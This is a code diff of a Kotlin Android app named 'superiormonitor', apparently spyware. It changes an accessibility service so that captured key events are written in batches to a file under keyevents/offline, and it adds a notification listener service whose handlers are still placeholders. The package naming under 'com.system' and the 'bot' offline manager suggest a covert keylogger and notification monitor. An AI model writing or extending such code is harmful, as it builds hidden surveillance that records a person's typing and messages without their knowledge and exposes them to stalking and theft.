@@ -1,16 +1,18 @@
-package com.system.superiormonitor.service
+package com.system.superiormonitor.core
 
 import android.accessibilityservice.AccessibilityService
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.service.notification.NotificationListenerService
+import android.service.notification.StatusBarNotification
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import com.system.superiormonitor.bot.OfflineManager
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -95,7 +97,10 @@ class MonitorAccessibilityService : AccessibilityService() {
         // Write the batch to file
         val batchText = currentBatch.toString()
         if (batchText.isNotBlank()) {
-            OfflineManager.queueOnly(this, batchText.trim(), "keyevents", "offline_keyevents.txt")
+            val offlineDir = java.io.File(getExternalFilesDir(null), "keyevents/offline")
+            if (!offlineDir.exists()) offlineDir.mkdirs()
+            val offlineFile = java.io.File(offlineDir, "offline_keyevents.txt")
+            offlineFile.appendText(batchText.trim() + "\n\n")
             currentBatch.clear()
         }
         
@@ -119,5 +124,25 @@ class MonitorAccessibilityService : AccessibilityService() {
             Log.e("MonitorAccessibility", "Error in onDestroy", e)
         }
         super.onDestroy()
+    }
+}
+
+class MonitorNotificationListenerService : NotificationListenerService() {
+    override fun onListenerConnected() {
+        super.onListenerConnected()
+        LogManager.log(LogCategory.SYSTEM, "Notification Listener connected")
+    }
+
+    override fun onListenerDisconnected() {
+        super.onListenerDisconnected()
+        LogManager.log(LogCategory.SYSTEM, "Notification Listener disconnected")
+    }
+
+    override fun onNotificationPosted(sbn: StatusBarNotification?) {
+        // Notification processing logic placeholder
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
+        // Notification removed logic placeholder
     }
 }
